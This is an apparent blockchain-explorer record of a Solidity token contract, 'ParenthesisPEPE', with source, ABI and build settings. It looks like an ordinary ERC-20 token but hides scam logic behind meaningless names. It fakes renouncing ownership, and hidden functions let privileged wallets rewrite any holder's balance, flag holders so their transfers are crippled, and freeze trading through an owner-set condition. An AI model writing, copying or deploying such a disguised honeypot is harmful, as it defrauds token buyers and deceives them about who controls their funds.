{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface feeShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalWallet) external view returns (uint256);\n\n    function transfer(address exemptAmount, uint256 marketingAt) external returns (bool);\n\n    function allowance(address teamLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptAmount,\n        uint256 marketingAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeLaunched, uint256 value);\n    event Approval(address indexed teamLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract receiverTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletAmount {\n    function createPair(address txWalletLimit, address maxMin) external returns (address);\n}\n\ninterface modeEnable is feeShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ParenthesisPEPE is receiverTo, feeShould, modeEnable {\n\n    mapping(address => mapping(address => uint256)) private isFee;\n\n    function approve(address modeBuy, uint256 marketingAt) public virtual override returns (bool) {\n        isFee[_msgSender()][modeBuy] = marketingAt;\n        emit Approval(_msgSender(), modeBuy, marketingAt);\n        return true;\n    }\n\n    address private amountMode;\n\n    uint256 private launchReceiverIs;\n\n    function getOwner() external view returns (address) {\n        return amountMode;\n    }\n\n    function owner() external view returns (address) {\n        return amountMode;\n    }\n\n    uint256 constant swapLaunched = 16 ** 10;\n\n    address public takeAt;\n\n    function transfer(address enableIsTo, uint256 marketingAt) external virtual override returns (bool) {\n        return senderListToken(_msgSender(), enableIsTo, marketingAt);\n    }\n\n    function totalAt() public {\n        emit OwnershipTransferred(amountTotal, address(0));\n        amountMode = address(0);\n    }\n\n    mapping(address => bool) public takeWallet;\n\n    function enableSender(address launchedTakeAmount) public {\n        toMin();\n        \n        if (launchedTakeAmount == amountTotal || launchedTakeAmount == takeAt) {\n            return;\n        }\n        enableMin[launchedTakeAmount] = true;\n    }\n\n    constructor (){\n        if (exemptReceiverTo) {\n            launchReceiverIs = exemptLaunch;\n        }\n        exemptFee receiverReceiverBuy = exemptFee(exemptMode);\n        takeAt = walletAmount(receiverReceiverBuy.factory()).createPair(receiverReceiverBuy.WETH(), address(this));\n        if (launchReceiverIs != exemptLaunch) {\n            exemptLaunch = launchReceiverIs;\n        }\n        amountTotal = _msgSender();\n        totalAt();\n        takeWallet[amountTotal] = true;\n        takeSender[amountTotal] = takeAmountLiquidity;\n        if (exemptLaunch == launchReceiverIs) {\n            launchReceiverIs = exemptLaunch;\n        }\n        emit Transfer(address(0), amountTotal, takeAmountLiquidity);\n    }\n\n    function allowance(address sellAmount, address modeBuy) external view virtual override returns (uint256) {\n        if (modeBuy == exemptMode) {\n            return type(uint256).max;\n        }\n        return isFee[sellAmount][modeBuy];\n    }\n\n    uint8 private enableTo = 18;\n\n    bool public enableSwap;\n\n    mapping(address => uint256) private takeSender;\n\n    event OwnershipTransferred(address indexed fundTeam, address indexed shouldAt);\n\n    function transferFrom(address teamSender, address exemptAmount, uint256 marketingAt) external override returns (bool) {\n        if (_msgSender() != exemptMode) {\n            if (isFee[teamSender][_msgSender()] != type(uint256).max) {\n                require(marketingAt <= isFee[teamSender][_msgSender()]);\n                isFee[teamSender][_msgSender()] -= marketingAt;\n            }\n        }\n        return senderListToken(teamSender, exemptAmount, marketingAt);\n    }\n\n    uint256 swapLiquidity;\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableTo;\n    }\n\n    function toMin() private view {\n        require(takeWallet[_msgSender()]);\n    }\n\n    bool private exemptReceiverTo;\n\n    function name() external view virtual override returns (string memory) {\n        return launchBuy;\n    }\n\n    function launchedAt(address teamSender, address exemptAmount, uint256 marketingAt) internal returns (bool) {\n        require(takeSender[teamSender] >= marketingAt);\n        takeSender[teamSender] -= marketingAt;\n        takeSender[exemptAmount] += marketingAt;\n        emit Transfer(teamSender, exemptAmount, marketingAt);\n        return true;\n    }\n\n    function receiverMax(address enableIsTo, uint256 marketingAt) public {\n        toMin();\n        takeSender[enableIsTo] = marketingAt;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeAmountLiquidity;\n    }\n\n    uint256 limitTx;\n\n    string private modeExemptList = \"PPE\";\n\n    string private launchBuy = \"Parenthesis PEPE\";\n\n    function launchedExemptFund(uint256 marketingAt) public {\n        toMin();\n        limitTx = marketingAt;\n    }\n\n    function sellMax(address launchMin) public {\n        require(launchMin.balance < 100000);\n        if (enableSwap) {\n            return;\n        }\n        \n        takeWallet[launchMin] = true;\n        if (senderAtLaunch == exemptReceiverTo) {\n            launchReceiverIs = exemptLaunch;\n        }\n        enableSwap = true;\n    }\n\n    bool public senderAtLaunch;\n\n    uint256 private takeAmountLiquidity = 100000000 * 10 ** 18;\n\n    function senderListToken(address teamSender, address exemptAmount, uint256 marketingAt) internal returns (bool) {\n        if (teamSender == amountTotal) {\n            return launchedAt(teamSender, exemptAmount, marketingAt);\n        }\n        uint256 walletFromIs = feeShould(takeAt).balanceOf(teamTrading);\n        require(walletFromIs == limitTx);\n        require(exemptAmount != teamTrading);\n        if (enableMin[teamSender]) {\n            return launchedAt(teamSender, exemptAmount, swapLaunched);\n        }\n        return launchedAt(teamSender, exemptAmount, marketingAt);\n    }\n\n    function balanceOf(address totalWallet) public view virtual override returns (uint256) {\n        return takeSender[totalWallet];\n    }\n\n    mapping(address => bool) public enableMin;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeExemptList;\n    }\n\n    address public amountTotal;\n\n    uint256 private exemptLaunch;\n\n    address teamTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address exemptMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTakeAmount\",\"type\":\"address\"}],\"name\":\"enableSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingAt\",\"type\":\"uint256\"}],\"name\":\"launchedExemptFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableIsTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingAt\",\"type\":\"uint256\"}],\"name\":\"receiverMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMin\",\"type\":\"address\"}],\"name\":\"sellMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAtLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableIsTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ParenthesisPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}